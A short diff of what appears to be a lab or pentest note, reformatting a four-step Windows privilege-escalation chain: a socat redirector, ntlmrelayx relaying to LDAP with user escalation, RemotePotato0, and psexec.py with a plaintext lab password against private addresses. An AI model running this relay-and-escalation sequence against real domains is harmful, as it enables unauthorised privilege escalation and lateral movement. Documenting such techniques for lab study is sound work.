@@ -12,10 +12,10 @@
 
 ## Steps
 
- - sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 (Terminal)
+    sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 (Terminal)
 
- - sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user (Terminal)
+    sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user (Terminal)
 
- - RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2 (Session 0)
+    RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2 (Session 0)
 
- - psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135' (Terminal)
+    psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135' (Terminal)
